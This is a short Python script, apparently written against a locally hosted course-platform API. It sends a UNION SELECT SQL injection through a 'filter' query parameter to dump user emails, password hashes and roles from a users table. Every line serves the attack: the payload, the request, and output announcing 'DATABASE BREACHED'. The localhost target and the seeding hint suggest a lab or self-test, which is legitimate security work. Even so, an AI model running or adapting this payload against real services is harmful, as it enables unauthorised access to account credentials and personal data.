import requests

# Target the courses API
URL = "http://127.0.0.1:8000/api/v1/courses"

# THE PAYLOAD:
# We need 9 columns. We will put:
# 1. id -> id (int)
# 2. email -> code (string)
# 3. password_hash -> title (string)
# 4. role -> description (text)
# 5-9. placeholders for the remaining columns
payload = "id=-1 UNION SELECT id, email, password_hash, role, 0, '[]', '{}', 0, '2023-01-01' FROM users"

print(f"[*] Attempting to dump User Database via Course Filter...")
# Send the fixed payload
response = requests.get(URL, params={"filter": payload})

if response.status_code == 200:
    data = response.json()
    if not data:
        print("[-] Connection successful, but no data returned. Make sure you seeded the database!")
    else:
        print("[!] SUCCESS: DATABASE BREACHED. LEAKED USER DATA:")
        for entry in data:
            # We mapped User email to 'code' and User hash to 'title'
            print(f"    User: {entry.get('code')} | MD5 Hash: {entry.get('title')} | Role: {entry.get('description')}")
else:
    print(f"[-] Attack failed. Status: {response.status_code}")
    # If it still fails, the backend terminal will show the specific SQL error
    print(f"    Server Response: {response.text}")